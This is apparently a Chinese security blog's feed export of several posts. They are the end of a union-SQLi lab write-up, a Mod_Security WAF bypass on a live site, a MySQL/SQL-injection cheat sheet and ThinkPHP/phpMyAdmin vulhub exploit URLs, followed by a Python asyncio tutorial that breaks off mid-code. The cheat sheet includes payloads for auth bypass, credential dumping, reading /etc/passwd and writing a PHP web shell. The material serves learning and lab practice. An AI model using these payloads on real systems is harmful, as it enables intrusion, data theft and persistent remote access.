srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>常规字符型注入，使用<code>--+</code>闭合单引号号即可，<br>在使用<code>union</code>进行注入时，<code>union</code>会变成<code>uni</code>，此时需要使用<code>unionon</code>。</p><pre><code>?item=3&#39; and 1=2 unionon select 1,user(),version(),4--+</code></pre><h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><p><img src="/images/pasted-8.png" class="lazyload" data-srcset="/images/pasted-8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>同Level 3，字符型注入，闭合单引号，注入语句无法使用<code>-</code>使其报错，可使用<code>and 1=2</code>。</p><pre><code>?ebookid=7&#39; and 1=2 union select 1,2,user(),version(),5--+</code></pre><h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p>需要爆破，待…</p><h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p><img src="/images/pasted-17.png" class="lazyload" data-srcset="/images/pasted-17.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><pre><code> and 1=2 union select (select id from teachers limit 1,1),(select teacher from teachers limit 1,1),(select teacher_age from teachers limit 1,1),(select price from teachers limit 1,1)--</code></pre><h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p><img src="/images/pasted-9.png" class="lazyload" data-srcset="/images/pasted-9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>这一关有点意思，注入好久没发现问题在哪，网上搜索后发现数据提交之后页面源代码中有个隐藏的<code>value</code>。</p><p><img src="/images/pasted-10.png" class="lazyload" data-srcset="/images/pasted-10.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>图中<code>value</code>的值就是注入点，后面都是常规注入操作</p><pre><code>?id=1 AND 1=2 UNION SELECT 1,user(),3--+</code></pre><h2 id="Level-8"><a href="#Level-8" class="headerlink" title="Level 8"></a>Level 8</h2><p><img src="/images/pasted-11.png" class="lazyload" data-srcset="/images/pasted-11.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>这一关会对<code>%20</code>进行过滤（初步判断）以及会对<code>select</code>进行检测，双写可绕过，数字型注入，可使用<code>%09、%0d</code>进行绕过，后面就是常规的注入操作。</p><pre><code>?id=1%09and%091=2%09union%09seselectlect%09user(),version(),3--%09-</code></pre><h2 id="Level-9"><a href="#Level-9" class="headerlink" title="Level 9"></a>Level 9</h2><p><img src="/images/pasted-12.png" class="lazyload" data-srcset="/images/pasted-12.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>这一关需要读取<code>/etc/passwd</code>文件，经测试知道<code>load_file()</code>被禁止。不过在插入SQL注入语句(字符型注入)时会报以下错误：</p><p><img src="/images/pasted-13.png" class="lazyload" data-srcset="/images/pasted-13.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>根据报错提示可以在<code>1</code>处进行读取</p><pre><code>?id=1&#39; and 1=2 union select &#39;../etc/passwd&#39;,2-- -</code></pre><h2 id="Level-10"><a href="#Level-10" class="headerlink" title="Level 10"></a>Level 10</h2><p><img src="/images/pasted-14.png" class="lazyload" data-srcset="/images/pasted-14.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>这一关<code>x</code>为注入点，但是参数是经过编码的，刚开始以为是<code>base64 encode + url encode</code>,解码后发现并没有那么简单，经过看别人的blog后了解到是<code>uuencode</code>，解码后参数显示为<code>1</code>。将SQL注入语句经过编码后可正常执行。</p><p><img src="/images/pasted-15.png" class="lazyload" data-srcset="/images/pasted-15.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br>将SQL注入语句编码后即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=2 union select 1,concat(user(),version())-- -</span><br><span class="line"></span><br><span class="line">经过uuencode加密后得到</span><br><span class="line">M,2!A;F0@,3TR(&#x27;5N:6]N(&#x27;-E;&amp;5C=&quot;`Q+&amp;-O;F-A=&quot;AU&lt;V5R*&quot;DL=F5R&lt;VEO</span><br><span class="line">(;B@I*2TM(&quot;T`</span><br><span class="line">`</span><br><span class="line"></span><br><span class="line">再使用base64进行编码得到</span><br><span class="line">TSwyIUE7RjBALDNUUignNU46Nl1OKCctRTsmNUM9ImBRKyYtTztGLUE9IkFVPFY1UioiREw9RjVSPFZFTwooO0JASSoyVE0oIlRgCmA=</span><br><span class="line"></span><br><span class="line">最后使用url编码得到最终payload</span><br><span class="line">TSwyIUE7RjBALDNUUignNU46Nl1OKCctRTsmNUM9ImBRKyYtTztGLUE9IkFVPFY1UioiREw9RjVSPFZFTwooO0JASSoyVE0oIlRgCmA%3D</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-16.png" class="lazyload" data-srcset="/images/pasted-16.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"><br><strong>done</strong></p><p><strong>参考链接 <a href="https://medium.com/ctf-writeups/union-sqli-challenges-zixem-write-up-4e74ad4e88b4">https://medium.com/ctf-writeups/union-sqli-challenges-zixem-write-up-4e74ad4e88b4</a></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Bypass Mod_Security</title>
      <link href="/14163.html"/>
      <url>/14163.html</url>
      
        <content type="html"><![CDATA[<h1 id="记bypass-Mod-Security"><a href="#记bypass-Mod-Security" class="headerlink" title="记bypass Mod_Security"></a>记bypass Mod_Security</h1><h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><pre><code>Google上搜索相关SQL注入，在测试中发现使用联合查询注入时会报错`Not Acceptable! An appropriate representation of the requested resource could not be found on this server. This error was generated by Mod_Security.`，使用order by 猜解显示位时不会报错</code></pre><h3 id="经过"><a href="#经过" class="headerlink" title="经过"></a>经过</h3><pre><code>懒得fuzz，直接Google搜索了相关bypass文章，文章中详细介绍了fuzz过程，直接修改payload进行注入。</code></pre><h3 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h3><pre><code>结果当然是ok的了，成功注出数据库名和版本信息，后面操作大同小异，溜溜球！</code></pre><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*!12345UnIoN*//**/(/*!12345SEleCt*//**/ 1,2,3,4,5,6,7)--+</span><br></pre></td></tr></table></figure><p><strong>done</strong> </p><p><strong>参考链接：<a href="https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad">https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad</a></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MYSQL备忘录</title>
      <link href="/22293.html"/>
      <url>/22293.html</url>
      
        <content type="html"><![CDATA[<ul><li>列出可用的数据库<br> <code>SHOW DATABASE;</code></li><li>切换到数据库<br>   <code>USE table_name</code></li></ul><h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><ul><li>添加新表<br> <code>CREATE TABLE logins (id INT, ...)</code></li><li>列出当前数据库中的可用表<br> <code>SHOW TABLES;</code></li><li>显示表属性和列<br> <code>DESCRIBE logins</code></li><li>将值添加到表<br> <code>INSERT INTO table_name VALUES (value_1,...)</code></li><li>将值添加到表中的特定列<br> <code>INSERT INTO table_name(colums2,...) VALUES(column2_value, ...)</code></li><li>更新表值<br> <code>UPDATE table_name SET column1=newvalue1,...WHERE &lt;CONDITION&gt;</code></li></ul><h3 id="列"><a href="#列" class="headerlink" title="列"></a>列</h3><ul><li>显示表格中的所有列<br> <code>SELECT * FROM table_name</code></li><li>显示表格中的特定列<br>   <code>SELECT column1, column2 FROM table_name</code></li><li>删除表<br> <code>DROP TABLE logins</code></li><li>添加新列<br> <code>ALTER TABLE logins ADD newColumn INT</code></li><li>重命名列<br> <code>ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn</code></li><li>更改列数据类型<br>   <code>ALTER TABLE logins MODIFY oldColumn DATE</code></li><li>删除列<br> <code>ALTER TABLE logins DROP oldColumn</code></li></ul><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><ul><li>按列排序<br>   <code>SELECT * FROM logins ORDER BY column_1</code></li><li>按列降序排序<br> <code>SELECT * FROM logins ORDER BY column_1 DESC</code></li><li>按两列排序<br> <code>SELECT * FROM logins ORDER BY column_1 DESC, id ASC</code></li><li>只显示前两个结果<br> <code>SELECT * FROM logins LIMIT 2</code></li><li>只显示从索引2开始的前两个结果<br> <code>SELECT * FROM logins LIMIT 1,2</code></li><li>列出满足条件的结果<br> <code>SELECT * FROM table_name WHERE &lt;condition&gt;</code></li><li>列出名称与给定字符串相似的结果<br>   <code>SELECT * FROM logins WHERE username LIKE &#39;admin%&#39;</code></li></ul><h3 id="MySQL运算符优先级"><a href="#MySQL运算符优先级" class="headerlink" title="MySQL运算符优先级"></a>MySQL运算符优先级</h3><ul><li>除法(&#x2F;)、乘法（<code>*</code>）和模数（%）</li><li>加法（+）和减法（-）</li><li>比较（&#x3D;,&gt;,&lt;,&lt;&#x3D;,&gt;&#x3D;,!&#x3D;,LIKE）</li><li>不是（！）</li><li>与（&amp;&amp;）</li><li>或（||）</li></ul><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><h3 id="身份验证绕过"><a href="#身份验证绕过" class="headerlink" title="身份验证绕过"></a>身份验证绕过</h3><ul><li>基本身份认证绕过<br>   <code>admin&#39; or &#39;1&#39;=&#39;1</code></li><li>带注释的基本身份验证绕过<br>   <code>admin&#39;)-- -</code></li></ul><h3 id="union-injection"><a href="#union-injection" class="headerlink" title="union injection"></a>union injection</h3><ul><li>使用检测列数 order by<br> <code>&#39; order by 1-- -</code></li><li>使用联合注入检测列数<br> <code>cn&#39; UNION select 1,2,3-- -</code></li><li>基本联合注入<br> <code>cn&#39; UNION select 1,@@version,3,4-- -</code></li><li>4列联合注入<br>   <code>UNION select username, 2, 3, 4 from passwords-- -</code></li></ul><h3 id="数据库枚举"><a href="#数据库枚举" class="headerlink" title="数据库枚举"></a>数据库枚举</h3><ul><li>带查询输出的指纹 MySQL<br> <code>SELECT @@version</code></li><li>没有输出的指纹 MySQL<br>   <code>SELECT SLEEP(5)</code></li><li>当前数据库名称<br> <code>cn&#39; UNION select 1,database(),2,3-- -</code></li><li>列出所有数据库<br>   <code>cn&#39; UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -</code></li><li>列出特定数据库中的所有表<br> <code>cn&#39; UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema=&#39;dev&#39;-- -</code></li><li>列出特定表中的所有列<br> <code>cn&#39; UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name=&#39;credentials&#39;-- -</code></li><li>从另一个数据库中的表转储数据<br> <code>cn&#39; UNION select 1, username, password, 4 from dev.credentials-- -</code></li></ul><h3 id="特权"><a href="#特权" class="headerlink" title="特权"></a>特权</h3><ul><li>查找当前用户<br>   <code>cn&#39; UNION SELECT 1,user(),3,4-- -</code></li><li>查找用户是否具有管理员权限<br>   <code>cn&#39; UNION SELECT 1,super_priv,3,4 FROM mysql.user WHERE user=&quot;root&quot;-- -</code></li><li>查找是否所有用户权限<br> <code>cn&#39; UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user=&quot;root&quot;-- -</code></li><li>查找可以通过 MySQL 访问的目录<br> <code>cn&#39; UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name=&quot;secure_file_priv&quot;-- -</code></li></ul><h3 id="文件注入"><a href="#文件注入" class="headerlink" title="文件注入"></a>文件注入</h3><ul><li>读取本地文件<br>   <code>cn&#39; UNION SELECT 1, LOAD_FILE(&quot;/etc/passwd&quot;), 3, 4-- -</code></li><li>将字符串写入本地文件<br> <code>select &#39;file written successfully!&#39; into outfile &#39;/var/www/html/proof.txt&#39;</code></li><li>将 web shell 写入基本 web 目录<br>   <code>cn&#39; union select &quot;&quot;,&#39;&lt;?php system($_REQUEST[0]); ?&gt;&#39;, &quot;&quot;, &quot;&quot; into outfile &#39;/var/www/html/shell.php&#39;-- -</code></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulhub</title>
      <link href="/26813.html"/>
      <url>/26813.html</url>
      
        <content type="html"><![CDATA[<h1 id="vulhub"><a href="#vulhub" class="headerlink" title="vulhub"></a>vulhub</h1><h2 id="ThinkPHP-2-x-任意代码执行漏洞"><a href="#ThinkPHP-2-x-任意代码执行漏洞" class="headerlink" title="ThinkPHP 2.x 任意代码执行漏洞"></a>ThinkPHP 2.x 任意代码执行漏洞</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">访问http://your-ip:8080/index.php?s=/index/index/name/$%7B@phpinfo()%7D即可执行phpinfo()</span><br></pre></td></tr></table></figure><h2 id="Thinkphp5-5-0-22-x2F-5-1-29-Remote-Code-Execution-Vulnerability"><a href="#Thinkphp5-5-0-22-x2F-5-1-29-Remote-Code-Execution-Vulnerability" class="headerlink" title="Thinkphp5 5.0.22&#x2F;5.1.29 Remote Code Execution Vulnerability"></a>Thinkphp5 5.0.22&#x2F;5.1.29 Remote Code Execution Vulnerability</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1</span><br></pre></td></tr></table></figure><h2 id="ThinkPHP5-5-0-23-Remote-Code-Execution-Vulnerability"><a href="#ThinkPHP5-5-0-23-Remote-Code-Execution-Vulnerability" class="headerlink" title="ThinkPHP5 5.0.23 Remote Code Execution Vulnerability"></a>ThinkPHP5 5.0.23 Remote Code Execution Vulnerability</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?s=captcha HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 72</span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</span><br></pre></td></tr></table></figure><h2 id="ThinkPHP5-SQL-Injection-Vulnerability-amp-amp-Sensitive-Information-Disclosure-Vulnerability"><a href="#ThinkPHP5-SQL-Injection-Vulnerability-amp-amp-Sensitive-Information-Disclosure-Vulnerability" class="headerlink" title="ThinkPHP5 SQL Injection Vulnerability &amp;&amp; Sensitive Information Disclosure Vulnerability"></a>ThinkPHP5 SQL Injection Vulnerability &amp;&amp; Sensitive Information Disclosure Vulnerability</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1</span><br></pre></td></tr></table></figure><h2 id="phpmyadmin-4-8-1-Remote-File-Inclusion-Vulnerability-CVE-2018-12613"><a href="#phpmyadmin-4-8-1-Remote-File-Inclusion-Vulnerability-CVE-2018-12613" class="headerlink" title="phpmyadmin 4.8.1 Remote File Inclusion Vulnerability (CVE-2018-12613)"></a>phpmyadmin 4.8.1 Remote File Inclusion Vulnerability (CVE-2018-12613)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>异步协程-02</title>
      <link href="/60636.html"/>
      <url>/60636.html</url>
      
        <content type="html"><![CDATA[<h1 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h1><h2 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h2><p><strong>死循环，检测代码并执行某些代码</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">任务列表 = [任务1，任务2，任务3...]</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">   可执行的任务列表，已完成的任务列表 = 去任务列表中检查所有的任务，将&quot;可执行&quot;和&quot;已完成&quot;的任务返回</span><br><span class="line">   for 就绪任务 in 可执行的任务列表：</span><br><span class="line">      执行已就绪的任务</span><br><span class="line">   for 已完成的任务 in 已完成的任务列表：</span><br><span class="line">      再任务列表中移除 已完成任务</span><br><span class="line">   </span><br><span class="line">   如果任务列表中的任务都已完成，则终止循环</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p><strong>协程函数，定义函数为async def 函数名</strong><br><strong>协程对象，执行 协程函数() 得到的协程对象</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">   <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">result = func()</span><br></pre></td></tr></table></figure><p><strong>注意：执行协程函数创建协程对象，函数内部代码不会执行</strong><br><strong>如果想要运行协程函数内部代码，必须要将协程对象交给事件循环来处理</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;test&quot;</span>)</span><br><span class="line"> </span><br><span class="line">result = func()</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">loop.run_until_complete(result)</span><br><span class="line"><span class="comment"># asyncio.run(result )</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="await关键字"><a href="#await关键字" class="headerlink" title="await关键字"></a>await关键字</h2><p><strong>await + 可等待对象（协程对象、Future、Task对象）-&gt; IO等待</strong><br><strong>一个协程函数中可以存在多个await</strong><br>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">others</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">   <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;end&quot;</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;返回值&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;执行协程函数内部代码&quot;</span>)</span><br><span class="line">   response = <span class="keyword">await</span> others()</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;IO请求结束， 结果为：&quot;</span> + response)</span><br><span class="line"></span><br><span class="line">asyncio.run(func())</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">执行协程函数内部代码</span><br><span class="line">start</span><br><span class="line">----------停顿</span><br><span class="line">end </span><br><span class="line">IO请求结束，结果为：  返回值</span><br></pre></td></tr></table></figure><h2 id="task对象"><a href="#task对象" class="headerlink" title="task对象"></a>task对象</h2><p><strong>Tasks用于并发调度协程，通过asyncio.create_task(协程对象)的方式创建Tak对象，这样可以让协程加入事件循环中等待被调度执行。除了使用asyncio.create_task()函数以外，还可以用低层级的loop.create_task()或ensure_future()函数，不建议手动实例化Task对象。</strong></p><p><strong>示例1</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">   <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">2</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;返回值&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;main 开始&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 创建Task对象，将当前执行func函数任务添加到事件循环中</span></span><br><span class="line">   </span><br><span class="line">   task1 = asyncio.create_task(func())</span><br><span class="line">   <span class="comment"># 创建Task对象，将当前执行func函数任务添加到事件循环中</span></span><br><span class="line">   task2 = asyncio.create_task(func())</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;main 结束&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   <span class="comment"># 当执行某协程遇到IO操作时，会自动化切换执行其他任务</span></span><br><span class="line">   <span class="comment"># 此处的await是等待相应的协程全都执行完毕并获取结果</span></span><br><span class="line">   ret1 = <span class="keyword">await</span> task1</span><br><span class="line">   ret2 = <span class="keyword">await</span> task2</span><br><span class="line">   </span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">main 开始</span><br><span class="line">main 结束</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">---------sleep(2秒)</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">返回值 返回值</span><br></pre></td></tr></table></figure><p><strong>示例2</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">   <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="number">2</span>)</span><br><span class="line">   <span class="keyword">return</span> <span class="string">&quot;返回值&quot;</span></span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;main 开始&quot;</span>)</span><br><span class="line">   </span><br><span class="line">   task_list = [</span><br><span class="line">      asyncio.create_task(func(), name=<span class="string">&quot;task1&quot;</span>)</span><br><span class="line">      asyncio.create_task(func(), name=<span class="string">&quot;task2&quot;</span>)</span><br><span class="line">   ]</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;main 结束&quot;</span>)</span><br><span class="line">   done, pending = <span class="keyword">await</span> asyncio.wait(task_list)</span><br><span class="line">   <span class="built_in">print</span>(done)</span><br><span class="line">   </span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">main 开始</span><br><span class="line">main 结束</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">--------sleep(2秒)</span><br><span class="line">2</span><br><span class="line">2</span><br><span class="line">&#123;&lt;Task finished name=&#x27;task1&#x27; coro=&lt;func() done, defined at C:/Users/v_zquanwang/Desktop/python-asycion/task_test.py:25&gt; result=&#x27;返回值&#x27;&gt;, &lt;Task finished name=&#x27;task2&#x27; coro=&lt;func() done, defined at C:/Users/v_zquanwang/Desktop/python-asycion/task_test.py:25&gt; result=&#x27;返回值&#x27;&gt;&#125;</span><br></pre></td></tr></table></figure><h3 id="async-Future对象"><a href="#async-Future对象" class="headerlink" title="async Future对象"></a>async Future对象</h3><p><strong>Task对象继承Future，Task对象内部await结果的处理基于Future对象来的</strong></p><h3 id="concurrent-futures-Future对象"><a href="#concurrent-futures-Future对象" class="headerlink" title="concurrent.futures.Future对象"></a>concurrent.futures.Future对象</h3><p><strong>使用线程池、进程池实现异步操作时用到的对象</strong></p><h3 id="异步迭代器"><a href="#异步迭代器" class="headerlink" title="异步迭代器"></a>异步迭代器</h3><p><strong>略</strong></p><h3 id="异步上下文管理器"><a href="#异步上下文管理器" class="headerlink" title="异步上下文管理器"></a>异步上下文管理器</h3><p><strong>此种对象通过定义<code>__aenter__()</code>和<code>__aexit__()</code>方法来对<code>async_with</code>语句中的环境进行控制</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AsyncContextManager</span>:</span><br><span class="line">   <span 